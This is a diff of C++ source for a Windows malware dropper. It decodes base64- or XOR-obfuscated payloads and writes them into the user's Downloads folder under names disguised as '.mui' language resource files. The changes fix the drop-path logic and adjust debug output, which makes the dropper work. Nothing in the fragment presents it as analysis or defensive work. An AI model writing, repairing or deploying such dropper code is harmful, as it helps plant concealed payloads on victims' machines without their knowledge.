@@ -177,8 +177,9 @@ int main(int argc, char* argv[])
 #else
 		dropper_start(1);
 		dropper_start(2);
-//		dropper_start(1);
 
+	printf("[%d]", DROPPER_BASE64);
+	printf("[%d]", DROPPER_XOR_KEY);
 	#ifdef DROPPER_BASE64 == 1
 		data1 = base64decode(data1, &size1);
 		data2 = base64decode(data2, &size2);
@@ -190,10 +191,6 @@ int main(int argc, char* argv[])
 		data2 = XOR(data2, size2);
 //		data1 = XOR(data1, size1);
 	#endif
-
-
-		printf("%.*s", 40, data1);
-		printf("%.*s", 40, data2);
 
 		drop(size1, data1, name1);
 		drop(size2, data2, name2);
@@ -307,7 +304,7 @@ void setup_name(std::uint64_t os_version) {
 			name1 += L"\\Downloads";
 			name2 += temp;
 			name2 += L"\\Downloads\\en-US";
-			CreateDirectoryW(name5.c_str(), NULL);
+			CreateDirectoryW(name2.c_str(), NULL);
 
 		} else {
 			printf("Problem with userprofile");
@@ -383,7 +380,7 @@ void set_name(std::uint64_t os_version)
 	MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);
 
 	name1+=out;
-	name1+=out;
+	name2+=out;
 	name2+=L".mui";
 
 #endif
